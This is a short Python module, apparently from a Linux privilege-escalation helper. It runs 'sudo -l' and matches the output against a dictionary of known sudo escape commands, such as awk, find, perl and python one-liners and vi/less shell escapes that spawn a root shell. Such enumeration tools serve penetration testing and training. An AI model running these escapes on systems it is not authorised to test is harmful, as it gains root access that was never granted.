# modules/sudo.py

import subprocess
from rich.console import Console

console = Console()

ESCAPE_COMMANDS = {
    "less": "sudo less /etc/passwd -> type !bash",
    "vi": "sudo vi -> :!bash",
    "vim": "sudo vim -> :!bash",
    "nano": "sudo nano -> ^R^X, then run bash",
    "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "find": "sudo find . -exec /bin/sh \;",
    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
    "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
    "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
}

def check_sudo():
    try:
        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)
        output = result.stdout.strip()
        console.print("[bold cyan]Sudo Permissions:[/bold cyan]")
        console.print(output)

        suggestions = []
        for binary in ESCAPE_COMMANDS:
            if binary in output:
                suggestions.append(ESCAPE_COMMANDS[binary])

        return {
            "sudo_output": output,
            "escape_suggestions": suggestions if suggestions else ["No known escapes detected"]
        }
    except Exception as e:
        console.print(f"[red]Error checking sudo permissions: {e}[/red]")
        return {}
